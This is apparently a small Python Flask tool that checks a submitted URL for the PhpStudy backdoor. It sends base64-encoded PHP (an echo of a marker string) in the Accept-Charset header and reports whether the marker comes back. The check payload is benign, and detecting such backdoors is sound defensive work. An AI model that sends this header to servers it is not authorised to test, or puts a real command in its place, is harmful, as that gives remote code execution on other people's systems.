# Author: CoolCat
# Email: 27958875@qq.com
# https://github.com/TheKingOfDuck

import requests
from flask import Flask,request,render_template

app = Flask(__name__)

@app.route('/', methods=['GET','POST'])
def index():
    if request.method == "GET":
        return render_template('index.html')
    else:
        vurl = request.form.get('vurl')

        session = requests.Session()
        headers = {"Accept-Charset": 'ZWNobygnVGhpc0lzQVRlc3RGb3JQaHBTdHVkeUJhY2tkb29yJyk7',
                   "Cache-Control": "max-age=0",
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                   "Upgrade-Insecure-Requests": "1",
                   "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
                   "Connection": "close",
                   "Accept-Language": "zh-CN,zh;q=0.9",
                   "Accept-Encoding": "gzip,deflate"
                   }
        response = session.get(url=vurl, headers=headers)

        if 'ThisIsATestForPhpStudyBackdoor' in response.text:
            return render_template('index.html', stat='True')
        else:
            return render_template('index.html', stat='False')

if __name__ == '__main__':
    app.run()
